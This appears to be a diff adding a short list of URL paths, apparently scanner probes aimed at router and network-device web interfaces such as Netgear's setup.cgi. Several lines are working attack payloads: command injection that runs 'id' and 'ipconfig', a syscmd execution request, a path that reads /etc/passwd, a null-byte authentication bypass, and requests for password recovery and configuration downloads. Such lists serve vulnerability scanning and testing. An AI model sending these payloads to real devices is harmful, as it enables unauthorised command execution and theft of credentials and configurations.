@@ -1,0 +1,12 @@
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20id
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20ipconfig
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1
+/cgi-bin/;cat$IFS/etc/passwd
+/passwordrecovered.cgi?id={{rand_base(5)}}
+/currentsetting.htm
+/RST_status.htm%00currentsetting.htm
+/setup.cgi?next_file=debug.htm&x=currentsetting.htm
+/debuginfo.htm
+/downloadFile.php?file=config
+/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN
+/rootDesc.xml
